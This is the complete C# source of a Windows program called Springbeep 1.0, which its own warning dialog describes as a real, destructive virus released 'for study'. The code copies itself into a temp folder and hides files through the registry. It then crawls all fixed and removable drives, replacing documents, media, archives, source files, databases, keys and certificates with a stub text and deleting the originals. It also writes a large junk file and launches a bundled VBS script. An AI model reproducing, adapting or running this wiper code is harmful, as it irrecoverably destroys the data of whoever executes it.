using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Springbeep
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (!Directory.Exists(Path.GetTempPath() + @"\HighSpeedCopy\"))
                Directory.CreateDirectory(Path.GetTempPath() + @"\HighSpeedCopy\");
            if (Path.GetFileName(Application.ExecutablePath) != "cmdtool.exe")
            {
                try
                {
                    if (File.Exists(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe"))
                        File.Delete(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
                    File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
                }
                catch
                {
                    ;
                }
                Process.Start(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
                Environment.Exit(0);
            }
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Springbeep.lock"))
                WakeInst();
            if (args.Length == 1)
            {
                if (args[0] == "/Autorun")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new Form1());
                }
                else if (Path.GetExtension(args[0]) == ".sbe")
                    try
                    {
                        File.Move(args[0], Path.GetDirectoryName(args[0]) + @"\" + Path.GetFileNameWithoutExtension(args[0]) + @".sbp");
                    }
                    catch
                    {
                        Environment.Exit(0);
                    }
                else if (Path.GetExtension(args[0]) == ".sbp")
                    try
                    {
                        File.Move(args[0], Path.GetDirectoryName(args[0]) + @"\" + Path.GetFileNameWithoutExtension(args[0]) + @".sbe");
                    }
                    catch
                    {
                        Environment.Exit(0);
                    }
                else
                    Environment.Exit(0);
            }
            else
            {
                Environment.Exit(0);
            }

        }

        static void WakeInst()
        {
            if (MessageBox.Show("你正在运行 Springbeep 1.0 病毒。\n它不是一个玩笑程序(Joke Program)，\n它会破坏你电脑上的所有数据，\n并使用垃圾填充硬盘防止恢复，\n因此请不要用它来破坏别人的电脑。\n我开源只是为了大家学习和交流，\n我不对因为误运行及被此病毒变种造成的后果负任何责任。\n请不要使用它做任何非善意的事情！\n目前病毒还未执行，\n点击是后病毒将立即开始执行，\n此时你的数据将会被破坏！\n如果你想反悔，你可以点击否来退出。", "Springbeep 1.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                Environment.Exit(0);
            RegistryKey Key = Registry.CurrentUser;
            RegistryKey Run = Key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
            Run.SetValue("Hidden", 1, RegistryValueKind.DWord);
            Key.Close();
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
                {
                    if (Directory.Exists(drive.Name)) DoAllFiles(drive.Name);
                }
            }
            string kbtext = "Springbeep 1.0", mbtext = "", longtext = "";
            for (int i = 1; i <= 1024 / 15; i++)
                kbtext += " Springbeep 1.0";
            for (int i = 1; i <= 1024; i++)
                mbtext += kbtext + " ";
            for (int i = 1; i <= 64; i++)
                longtext += mbtext + " ";
            File.WriteAllText(Path.GetTempPath() + @"\HighSpeedCopy\winload.bin", longtext);
            if (Application.ExecutablePath != Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe" && !File.Exists(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe"))
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
            File.WriteAllBytes(Path.GetTempPath() + @"\HighSpeedCopy\mode.vbs", Properties.Resources.mode);
            Process.Start("wscript.exe", "\"" + Path.GetTempPath() + "\\HighSpeedCopy\\mode.vbs\"");
            Environment.Exit(0);
        }

        static void DoAllFiles(string path)
        {
            string[] exnamelist = { "ppt", "pptx", "doc", "docx", "xlsx",
                "sxi", "sxw", "odt", "hwp", "zip", "rar", "tar", "mp4", "mkv"
                , "db", "7z", "cs", "res", "resx", "sln", "iso", "dmg", "isz"
                , "ico", "png", "jpg", "jpeg", "mp3", "mp4", "pdf", "ogg", "wav", "wmv",
                "eml", "msg", "ost", "pst", "deb", "sql", "accdb", "mdb", "dbf"
                , "odb", "myd", "php", "java", "cpp", "asp", "asm", "key", "pfx"
                , "pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef"
                , "svg", "psd", "vmx", "vmdk", "vdi"
                };
            DirectoryInfo dir = new DirectoryInfo(path);
            try
            {
                DirectoryInfo[] info = dir.GetDirectories();
                foreach (DirectoryInfo d in info)
                {
                    if (path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.Windows) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86))
                        DoAllFiles(dir + d.ToString() + @"\");
                }
                FileInfo[] file = dir.GetFiles();
                foreach (FileInfo next in file)
                {
                    string fileName = next.ToString();
                    if (fileName.LastIndexOf('.') != -1)
                    {
                        bool s = false;
                        string exname = fileName.Substring(fileName.LastIndexOf('.') + 1);
                        foreach (string exnametmp in exnamelist)
                        {
                            if (exname == exnametmp)
                            {
                                s = true;
                                break;
                            }
                        }
                        if (s)
                            DoFile(dir + fileName);
                    }
                }
            }
            catch
            {
                ;
            }
        }
        private static bool DoFile(string fileName)
        {
            try
            {
                File.SetAttributes(fileName, FileAttributes.Normal);
                File.Move(fileName, Path.GetDirectoryName(fileName) + @"\" + Path.GetFileNameWithoutExtension(fileName) + @".tmp");
                File.WriteAllText(Path.GetDirectoryName(fileName)+@"\"+Path.GetFileNameWithoutExtension(fileName) + @".sbe", @"This is a very bad world.");
                File.Delete(Path.GetDirectoryName(fileName) + @"\"+Path.GetFileNameWithoutExtension(fileName) + @".tmp");
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
